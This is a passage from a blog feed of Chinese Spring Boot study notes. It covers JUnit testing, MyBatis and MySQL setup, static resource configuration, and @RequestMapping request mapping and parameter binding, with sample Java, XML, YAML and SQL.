<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>下载<code>Maven Helper</code>插件，重启<code>idea</code>后，打开<code>pom.xml</code>,下面就有<code>Dependency  Analyzer</code>，<code>refresh</code>后可以找到冲突项，然后选择低版本的，右键<code>exclude</code>，再次刷新后问题解决。</p>
<h4 id="修改依赖后如何生效？"><a href="#修改依赖后如何生效？" class="headerlink" title="修改依赖后如何生效？"></a>修改依赖后如何生效？</h4><p>很简单，右上角有一个Maven的图标，load一下change就好了</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://space.bilibili.com/663528522">三根草堂</a>师父的<code>Spring Boot</code>系列教程</p>
]]></content>
      <categories>
        <category>Development</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot-常见场景(2)</title>
    <url>/2021/07/17/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2-%E6%9B%B4%E6%96%B0%E4%B8%AD/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>非常感谢<a href="https://space.bilibili.com/663528522">三根草堂</a>师父的<code>Spring Boot</code>系列教程，内容基本来源于<strong>三根草堂</strong>师父，此笔记接上一篇<a href="https://leihehehe.github.io/2021/07/16/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/">SpringBoot-基础入门笔记(1)</a></p>
<h1 id="Junit单元测试"><a href="#Junit单元测试" class="headerlink" title="Junit单元测试"></a>Junit单元测试</h1><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="编写测试类"><a href="#编写测试类" class="headerlink" title="编写测试类"></a>编写测试类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationTest</span> &#123;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> HelloController helloController;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJunit</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line">System.out.println(helloController);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>测试类需要和启动类在同一个包下（即相同的包结构），当然也可以指定<code>Classes</code>来指定启动类</p>
<p><img src="/image/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2/image-20210717200054898.png" alt="image-20210717200054898"></p>
<h2 id="兼容老版本"><a href="#兼容老版本" class="headerlink" title="兼容老版本"></a>兼容老版本</h2><p><strong>vintage依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>org.junit.Test对应的是Junit4的版本，就搭配@RunWith注解来使用。<br><strong>SpringBoot2.2.0之前版本的写法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="comment">//import org.junit.jupiter.api.Test;</span></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"><span class="comment">//classes属性来指定启动类</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationTest</span> &#123;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> HelloController helloController;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJunit</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line">System.out.println(helloController);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Junit常见问题"><a href="#Junit常见问题" class="headerlink" title="Junit常见问题"></a>Junit常见问题</h2><p>如果Junit的<code>Test Class</code>没有放在和你的启动Class同一<code>package</code>格式下，会出现错误。</p>
<p>有两个解决方法</p>
<ul>
<li>将Test Class放回与启动Class同一<code>package</code>结构下</li>
<li>在<code>@SpringBootTest</code>注释处指定Classses=你的启动类.class</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//unit test</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = HelloApplication.class)</span><span class="comment">//此处指定你的启动类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationTest</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HelloController helloController;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJunit</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="number">1</span>);</span><br><span class="line">    System.out.println(helloController);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Mybatis整合"><a href="#Mybatis整合" class="headerlink" title="Mybatis整合"></a>Mybatis整合</h1><h2 id="创建database"><a href="#创建database" class="headerlink" title="创建database"></a>创建database</h2><p>我以<code>mysql</code>为例子，先给他导入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*Table structure for table `user` */</span><br><span class="line">DROP TABLE IF EXISTS `user`;</span><br><span class="line">CREATE TABLE `user` (</span><br><span class="line">`id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">`username` varchar(50) DEFAULT NULL,</span><br><span class="line">`age` int(11) DEFAULT NULL,</span><br><span class="line">`address` varchar(50) DEFAULT NULL,</span><br><span class="line">PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;</span><br><span class="line">/*Data for the table `user` */</span><br><span class="line">insert into `user`(`id`,`username`,`age`,`address`) values (2,&#x27;pdd&#x27;,25,&#x27;上海&#x27;),</span><br><span class="line">(3,&#x27;UZI&#x27;,19,&#x27;上海11&#x27;),(4,&#x27;RF&#x27;,19,NULL),(6,&#x27;三更&#x27;,14,&#x27;请问2&#x27;),(8,&#x27;test1&#x27;,11,&#x27;cc&#x27;),</span><br><span class="line">(9,&#x27;test2&#x27;,12,&#x27;cc2&#x27;);</span><br><span class="line">/*40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span><br><span class="line">/*40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br></pre></td></tr></table></figure>

<p><img src="/image/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2-%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20210718114106182.png" alt="image-20210718114106182"></p>
<h2 id="Java中创建entity"><a href="#Java中创建entity" class="headerlink" title="Java中创建entity"></a>Java中创建entity</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leihehe.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="添加依赖-1"><a href="#添加依赖-1" class="headerlink" title="添加依赖"></a>添加依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--myBatis的启动器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--myBatis的驱动--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里<code>mybatis-spring-boot-starter</code>的版本号需要指定，我们可以通过<a href="https://github.com/mybatis/spring-boot-starter">spring-boot-starter github</a>上的<strong>requirement</strong>看到不同<code>JDK</code>和<code>SpringBoot</code>版本对应的<code>mybatis</code>版本号，这里我选择<code>2.2.0</code></p>
<h2 id="配置数据库信息"><a href="#配置数据库信息" class="headerlink" title="配置数据库信息"></a>配置数据库信息</h2><p>在<code>yaml</code>文件中写入数据</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置数据库,下面的SpringBootLearn是数据库名字</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/SpringBootLearn?characterEncoding=utf-8&amp;serverTimezone=UTC</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置mybatis</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*Mapper.xml</span> <span class="comment"># mapper映射文件路径,是在resources/mapper下</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.leihehe.domain</span> <span class="comment"># 配置哪个包下的类有默认的别名,我们的entity是放在domain下的</span></span><br></pre></td></tr></table></figure>

<h2 id="Mapper文件"><a href="#Mapper文件" class="headerlink" title="Mapper文件"></a>Mapper文件</h2><p>在resources里创建mapper文件夹/mapper.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.leihehe.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.leihehe.domain.User&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="Web开发"><a href="#Web开发" class="headerlink" title="Web开发"></a>Web开发</h1><h2 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h2><blockquote>
<p>静态资源可以放到 resources/static (或者 resources/public 或者resources/resources 或者 resources/META-INF/resources ) 中即可。</p>
<p>静态资源放完后，例如我们想访问文件resources/static/index.html 只需要在访问时资源路径写成/index.html即可。</p>
<p>例如我们想访问文件：resources/static/pages/login.html 访问的资源路径写成： /pages/login.html</p>
</blockquote>
<p><img src="/image/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2-%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20210718161702479.png" alt="image-20210718161702479"></p>
<h3 id="修改静态资源访问目录"><a href="#修改静态资源访问目录" class="headerlink" title="修改静态资源访问目录"></a>修改静态资源访问目录</h3><p>在<code>application.xml</code>中修改</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#记住static path就可以了</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">static-path-pattern:</span> <span class="string">/res/**</span></span><br><span class="line">    <span class="comment">#默认是/**</span></span><br></pre></td></tr></table></figure>

<h3 id="修改静态资源存放目录"><a href="#修改静态资源存放目录" class="headerlink" title="修改静态资源存放目录"></a>修改静态资源存放目录</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#记住static location就可以了</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">static-locations:</span> <span class="string">classpath:/abc</span></span><br><span class="line">      <span class="comment">#这样静态资源就需要放在resources/abc/下了</span></span><br></pre></td></tr></table></figure>

<p>也可以设置多个static存放目录</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">static-locations:</span> </span><br><span class="line">     	 <span class="bullet">-</span> <span class="string">classpath:/abc</span></span><br><span class="line">     	 <span class="bullet">-</span> <span class="string">classpath:/static</span></span><br><span class="line">      <span class="comment">#这样静态资源可以放在以上两个文件夹中，同时都可以被访问到</span></span><br></pre></td></tr></table></figure>

<h2 id="RequestMapping请求映射规则"><a href="#RequestMapping请求映射规则" class="headerlink" title="@RequestMapping请求映射规则"></a>@RequestMapping请求映射规则</h2><h3 id="指定请求路径"><a href="#指定请求路径" class="headerlink" title="指定请求路径"></a>指定请求路径</h3><ul>
<li><code>@RequestMapping</code>可以放在<code>method</code>上面，也可以放在<code>Class</code>上面</li>
<li><code>path</code>或者<code>value</code>属性都可以用来指定请求路径</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span><span class="comment">//该处规定 只有访问/test才能触发这个controller</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span><span class="comment">//只有访问/test/hello才能触发</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/testPath&quot;)</span><span class="comment">//只有访问/test/testPath 才能触发</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testPath</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testPath&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="指定请求方式"><a href="#指定请求方式" class="headerlink" title="指定请求方式"></a>指定请求方式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/testMethod&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者我们可以更简便一点：</p>
<blockquote>
<p>@PostMapping 等价于 @RequestMapping(method = RequestMethod.POST)<br>@GetMapping 等价于 @RequestMapping(method = RequestMethod.GET)<br>@PutMapping 等价于 @RequestMapping(method = RequestMethod.PUT)<br>@DeleteMapping 等价于 @RequestMapping(method = RequestMethod.DELETE)</p>
</blockquote>
<h3 id="指定请求参数"><a href="#指定请求参数" class="headerlink" title="指定请求参数"></a>指定请求参数</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod&quot;,params = &quot;a&quot;)</span><span class="comment">//post中必须要有a值</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod1&quot;,params = &quot;!a&quot;)</span><span class="comment">//post中必须不能有a值</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod2&quot;,params = &quot;a=1&quot;)</span><span class="comment">//post中必须有a值且a值必须为1</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod3&quot;,params = &quot;a!=1&quot;)</span><span class="comment">//post中必须有a值且a值不能为1</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="指定请求头"><a href="#指定请求头" class="headerlink" title="指定请求头"></a>指定请求头</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod&quot;,params = &quot;a&quot;,headers = &quot;deviceType&quot;)</span><span class="comment">//请求头必须是deviceType</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;header&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod1&quot;,headers = &quot;!deviceType&quot;)</span><span class="comment">//请求头必须不能是deviceType</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;header&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod2&quot;,headers = &quot;deviceType=ios&quot;)</span><span class="comment">//请求头必须是deviceType且等于ios</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;header&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod3&quot;,headers = &quot;deviceType!=ios&quot;)</span><span class="comment">//请求头必须是deviceType且不等于ios</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;header&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="指定请求头Content-Type"><a href="#指定请求头Content-Type" class="headerlink" title="指定请求头Content-Type"></a>指定请求头Content-Type</h3><p><strong>Content-Type</strong>可使用<strong>consume</strong>来指定</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(method = RequestMethod.GET,value = &quot;/testMethod&quot;,consumes = &quot;multipart/form-data&quot;)</span><span class="comment">//ContentType必须是multipart/form-data</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RequestMapping(method = RequestMethod.GET,value = &quot;/testMethod1&quot;,consumes = &quot;!multipart/form-data&quot;)</span><span class="comment">//ContentType不能是multipart/form-data</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数"></a>获取请求参数</h2><h3 id="路径参数"><a href="#路径参数" class="headerlink" title="路径参数"></a>路径参数</h3><blockquote>
<p>RestFul风格的接口一些参数在请求路径上。</p>
<p>比如/user/1,这里的1就是id</p>
</blockquote>
<p>那么如果我们想获取路径上的参数，我们可以用<code>@PathVariable</code>来实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单个参数</span></span><br><span class="line"><span class="meta">@RequestMapping(method = RequestMethod.GET,value = &quot;/user/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> <span class="type">int</span> myID)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;your id is &quot;</span>+myID;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多个参数</span></span><br><span class="line">    <span class="meta">@RequestMapping(method = RequestMethod.GET,value = &quot;/user/&#123;id&#125;/&#123;name&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testMethod1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> <span class="type">int</span> myID,<span class="meta">@PathVariable</span> String myName)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;your id is &quot;</span>+myID+<span class="string">&quot; and your name is &quot;</span>+myName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="json参数"><a href="#json参数" class="headerlink" title="json参数"></a>json参数</h3><blockquote>
<p>RestFul风格的接口中，一些复杂的参数会转换成json传参，那么我们可以用<code>@RequestBody</code>来获取数据</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span>&#123;</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;insertUser&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>POSTMAN</code>中发送<code>JSON</code>内容：<code>&#123;&quot;name&quot;:&quot;leihehe&quot;,&quot;age&quot;:10&#125;</code></p>
<p>多个用户数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/multipleUsers&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">insertUser</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;User&gt; users)</span>&#123;</span><br><span class="line">    System.out.println(users);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;insert Users&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>POSTMAN</code>中发送<code>JSON</code>内容：</p>
<p><code>[&#123;&quot;name&quot;:&quot;leihehe&quot;,&quot;age&quot;:10&#125;,&#123;&quot;name&quot;:&quot;xiaoming&quot;,&quot;age&quot;:11&#125;,&#123;&quot;name&quot;:&quot;wangzhe&quot;,&quot;age&quot;:12&#125;]</code></p>
<p>注意发送的时候要选择<code>json</code></p>
<p><img src="/image/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2-%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20210718172352273.png" alt="image-20210718172352273"></p>
<h3 id="QueryString参数"><a href="#QueryString参数" class="headerlink" title="QueryString参数"></a>QueryString参数</h3><h4 id="什么是QueryString参数？"><a href="#什么是QueryString参数？" class="headerlink" title="什么是QueryString参数？"></a>什么是QueryString参数？</h4><p>格式类似于<code>/users?name=leihehe&amp;age=11</code></p>
<p>可以使用<code>@RequestParam</code>来获取<code>QueryString</code>格式的参数</p>
<h4 id="如何获取？"><a href="#如何获取？" class="headerlink" title="如何获取？"></a>如何获取？</h4><p>若请求参数和我们方法里的变量名一样，则不需要<code>@RequestParam</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="type">int</span> id, String name, String[] likes)</span>&#123;</span><br><span class="line">    System.out.println(id);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若请求参数和我们方法里的变量名不一样，需要<code>@RequestParam</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(<span class="meta">@RequestParam</span> <span class="type">int</span> id, String name, String[] likes)</span>&#123;</span><br><span class="line">    System.out.println(id);</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(Arrays.toString(likes));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实体获取：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testRequestParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestParam</span><span class="params">(User user)</span>&#123;</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;requestParam&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

